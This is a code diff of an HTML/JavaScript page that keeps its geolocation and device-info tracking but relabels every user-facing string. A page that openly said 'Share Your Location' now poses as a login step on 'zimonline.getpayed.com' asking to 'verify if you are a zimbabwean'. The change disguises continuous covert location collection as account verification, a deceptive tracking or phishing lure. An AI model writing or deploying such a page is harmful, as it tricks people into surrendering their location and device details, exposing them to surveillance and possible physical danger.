@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>Location Sharing</title>
+    <title>zimonline.getpayed.com</title>
 
     <style>
         * {
@@ -161,12 +161,12 @@
         </div>
 
         <h1>
-            Share Your Location
+            Your need to Login 
         </h1>
 
         <div class="description">
-            Press the button below to share your current location.
-            Your browser will ask you to grant location permission.
+            Press the button below to allow this browser to 
+            verify if you are a zimbabwean.
         </div>
 
         <div class="status">
@@ -179,7 +179,7 @@
             <div
                 class="status-text"
                 id="statusText">
-                LOCATION NOT SHARED
+                Status not verified
             </div>
 
         </div>
@@ -189,7 +189,7 @@
             class="button"
             id="shareButton">
 
-            START LOCATION SHARING
+            Start Verification
 
         </button>
 
@@ -197,8 +197,8 @@
             class="sharing-info"
             id="sharingInfo">
 
-            ✓ Location sharing is active.<br>
-            Your location will update automatically while you move.
+            ✓ Your account is verified now.<br>
+            Please be wait a moment while finalizing...
 
         </div>
 
@@ -206,7 +206,7 @@
             class="message"
             id="message">
 
-            Location sharing has not started.
+            Verification not started.
 
         </div>
 
@@ -309,17 +309,17 @@ async function sendLocation(position) {
         if (!response.ok) {
 
             throw new Error(
-                "Location update failed."
+                "Region update failed."
             );
         }
 
         setStatus(
-            "LOCATION SHARING ACTIVE",
+            "Account Verified",
             "live"
         );
 
         showMessage(
-            "Your location is being updated automatically."
+            "Your account will be verified automatically next time you login."
         );
 
     } catch (error) {
@@ -330,7 +330,7 @@ async function sendLocation(position) {
         );
 
         showMessage(
-            "Your location could not be sent. Please check your internet connection."
+            "Your account could not be verified. Please check your internet connection."
         );
     }
 }
@@ -480,12 +480,12 @@ function startSharing() {
     if (!navigator.geolocation) {
 
         setStatus(
-            "LOCATION NOT SUPPORTED",
+            "verification is not supported",
             "error"
         );
 
         showMessage(
-            "This browser does not support location services."
+            "This browser does not support this website terms."
         );
 
         return;
@@ -498,7 +498,7 @@ function startSharing() {
     sharing = true;
 
     shareButton.textContent =
-        "STOP LOCATION SHARING";
+        "Stop Verification";
 
     shareButton.classList.add(
         "stop"
@@ -509,12 +509,12 @@ function startSharing() {
     );
 
     setStatus(
-        "REQUESTING LOCATION",
+        "REQUESTING VERIFICATION",
         ""
     );
 
     showMessage(
-        "Please allow location access in your browser."
+        "Please allow location access in your browser to proceed with verification."
     );
 
     sendDeviceInfo();
@@ -537,7 +537,7 @@ function handleLocationError(error) {
     if (error.code === 1) {
 
         setStatus(
-            "LOCATION PERMISSION DENIED",
+            "VERIFICATION DENIED",
             "error"
         );
 
@@ -597,7 +597,7 @@ function stopSharing() {
     sharing = false;
 
     shareButton.textContent =
-        "START LOCATION SHARING";
+        "START ACCOUNT VERIFICATION";
 
     shareButton.classList.remove(
         "stop"
@@ -608,12 +608,12 @@ function stopSharing() {
     );
 
     setStatus(
-        "LOCATION NOT SHARED",
+        "ACCOUNT NOT VERIFIED",
         ""
     );
 
     showMessage(
-        "Location sharing has been stopped."
+        "Account verification has been stopped."
     );
 }
 
